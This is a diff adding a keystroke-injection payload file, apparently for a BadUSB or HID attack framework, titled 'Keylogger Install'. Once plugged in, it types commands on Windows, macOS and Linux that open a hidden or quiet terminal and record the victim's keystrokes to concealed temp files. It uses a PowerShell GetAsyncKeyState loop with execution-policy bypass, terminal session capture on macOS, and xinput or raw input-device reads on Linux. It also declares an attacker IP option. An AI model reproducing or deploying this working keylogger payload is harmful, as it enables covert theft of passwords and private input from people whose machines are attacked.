@@ -1,0 +1,31 @@
+NAME Keylogger Install
+DESCRIPTION Installs a lightweight keylogger that captures keystrokes to a file
+CATEGORY post
+PLATFORMS WIN,MAC,LINUX
+OPTION LHOST 192.168.1.100 "Attacker IP (your machine)"
+OPTION DURATION 60 "Capture duration in seconds"
+OPTION DELAY 2000 "Initial HID enumeration delay (ms)"
+PLATFORM WIN
+DELAY {{DELAY}}
+GUI r
+DELAY 800
+STRING powershell -nop -ep bypass -w hidden
+ENTER
+DELAY 1200
+STRING $o="$env:TEMP\kl.txt";$d={{DURATION}};$e=(Get-Date).AddSeconds($d);$s=@{};Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class KL{[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int k);}';while((Get-Date)-lt $e){for($i=8;$i -le 190;$i++){if([KL]::GetAsyncKeyState($i) -band 1){Add-Content $o ([char]$i)}};Start-Sleep -ms 50};Write-Host "Keylog saved to $o"
+ENTER
+PLATFORM MAC
+DELAY {{DELAY}}
+GUI SPACE
+DELAY 700
+STRING Terminal
+ENTER
+DELAY 1400
+STRING script -q /tmp/.kl sh -c 'sleep {{DURATION}}' && strings /tmp/.kl > /tmp/.kl2 && mv /tmp/.kl2 /tmp/.kl && echo "Keylog saved to /tmp/.kl"
+ENTER
+PLATFORM LINUX
+DELAY {{DELAY}}
+CTRL ALT t
+DELAY 1400
+STRING KID=$(xinput list 2>/dev/null | grep -i keyboard | grep -oP 'id=\K[0-9]+' | head -1); if [ -n "$KID" ]; then timeout {{DURATION}} xinput test $KID > /tmp/.kl 2>/dev/null & echo "Keylog capturing to /tmp/.kl (PID $!)"; else sudo timeout {{DURATION}} cat /dev/input/event0 | xxd > /tmp/.kl 2>/dev/null & echo "Keylog capturing to /tmp/.kl"; fi
+ENTER
